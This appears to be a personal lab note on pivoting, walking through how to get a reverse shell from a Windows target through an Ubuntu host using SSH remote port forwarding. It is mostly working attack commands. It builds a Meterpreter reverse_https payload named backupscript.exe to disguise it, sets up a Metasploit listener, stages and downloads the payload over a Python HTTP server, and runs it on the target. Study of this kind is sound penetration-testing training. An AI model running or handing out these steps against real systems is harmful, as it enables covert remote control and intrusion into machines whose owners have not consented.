![[Pasted image 20250804153829.png]]Your **Windows target** can only reach the **internal Ubuntu server**, not your **attacker machine (Kali/Parrot)**. To get a **reverse shell from Windows**, we:
- Make **Ubuntu act as a middleman**.
- Use **SSH remote port forwarding** to send the reverse shell **from Windows â†’ Ubuntu â†’ Attacker**.
- 
#### **Step 1: Create a Reverse Shell Payload (for windows machine)**
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backupscript.exe
```

#### Step 2: Set Up a Listener on Your Attacker Machine
```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 8000
run
```
- `LHOST=0.0.0.0`: Listen on **all interfaces**
- `LPORT=8000`: Where Ubuntu will forward the shell

#### **Step 3: Copy Payload to the Ubuntu Pivot Host**
```bash
scp backupscript.exe ubuntu@<Ubuntu_IP>:~/
```

#### **Step 4: Start a Python HTTP Server on Ubuntu**

```bash
python3 -m http.server 8123
```
This allows Windows to download `backupscript.exe`.

#### **Step 5: Download the Payload on the Windows Target**
```bash
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

#### **Step 6: Set Up Reverse Port Forwarding Using SSH**
```bash
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@<Ubuntu_IP> -vN
```
- `-R`: Remote port forwarding
- `172.16.5.129:8080`: Ubuntu listens here
- `0.0.0.0:8000`: Forward traffic to your listener
ðŸ’¡ Result: Any connection to Ubuntuâ€™s `172.16.5.129:8080` gets forwarded to your `8000` listener.

**Step 7: Execute the Payload on the Windows Machine**
```bash
C:\backupscript.exe
```


![[Pasted image 20250804154330.png]]